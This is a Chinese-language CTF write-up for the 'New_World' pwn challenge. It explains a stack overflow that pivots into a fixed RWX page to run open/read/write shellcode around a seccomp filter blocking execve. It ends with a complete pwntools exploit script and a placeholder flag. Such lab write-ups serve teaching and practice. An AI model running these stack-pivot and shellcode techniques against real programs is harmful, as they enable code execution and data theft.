# New_World WP

## 题目分析

程序是 64 位 ELF，动态链接 `libseccomp.so.2`，且未加壳。

静态看主流程：

- `main()` 先调用 `IO()`
- 然后 `mmap(0x1337000, 0x1000, 7, 0x32, -1, 0)`，也就是固定映射一块 `RWX` 内存
- 最后进入 `New_World()`

`IO()` 里做了两件事：

- 安装 seccomp
- 关闭标准输入输出缓冲

seccomp 只禁了两个 syscall：

- `execve`
- `execveat`

也就是说，`open/read/write` 这些都还可以用。

## 漏洞点

`New_World()` 的交互大概是：

1. `inquire()` 先读 4 字节到全局映射页 `p`
2. 再问一次 `y/no`
3. 如果输入 `y`，就进入 `init()`

真正的漏洞在 `init()`：

- 栈上只有 `0x40` 字节缓冲区
- 但它用 `read(0, rbp-0x40, 0x60)`

这会直接覆盖：

- saved `rbp`
- saved `rip`

所以这是一个标准的栈溢出。

## 利用思路

题目最关键的点是：

- 程序已经把 `0x1337000` 映射成了可执行内存
- 我们不需要 ROP 搞复杂链，只要把第二阶段 shellcode 写进去，再跳过去执行即可

关键栈迁移点是 `init+0x16`，也就是地址 `0x401347`。

第一次溢出时构造：

- padding 填满 0x40 字节
- saved `rbp` 改成 `0x1337040`
- 返回地址改成 `0x401347`

这样第一次 `init` 返回后，会再次执行 `read`，但这次 `rbp` 已经被我们改掉了，于是它会把第二阶段读到：

- `rbp - 0x40 = 0x1337000`

也就是那块 RWX 页。

第二阶段内容直接放 shellcode：

- `open("flag", 0)`
- `read(fd, buf, n)`
- `write(1, buf, n)`

最后再伪造一个简单栈帧：

- saved `rbp = 0`
- 返回地址 = `0x1337000`

这样 `ret` 之后就直接跑 shellcode。

## EXP

```python
#!/usr/bin/env python3
from pwn import *

context.clear(arch="amd64", os="linux")
context.log_level = "error"

P = 0x1337000
READ_IN_INIT = 0x401347

io = process("./New_World", cwd=".")

# 第一次 init 的溢出：
#   0x40 字节 buffer
#   saved rbp -> 0x1337040
#   ret       -> 0x401347
stage1 = b"A" * 0x40 + p64(P + 0x40) + p64(READ_IN_INIT)
stage1 = stage1.ljust(0x60, b"B")

# 第二阶段 shellcode：ORW
sc = asm(
    shellcraft.open("flag", 0)
    + shellcraft.read("rax", P + 0x300, 0x80)
    + shellcraft.write(1, P + 0x300, 0x80)
)

# 第二次 read 把 shellcode 写入 0x1337000
# 栈迁移后，leave; ret 最终跳到 0x1337000
stage2 = sc.ljust(0x40, b"\x90") + p64(0) + p64(P)
stage2 = stage2.ljust(0x60, b"C")

io.send(b"AAAA" + b"y" + stage1 + stage2)
io.interactive()
```

## 结果

最终 flag：

```text
flag{0000000000000000}
```
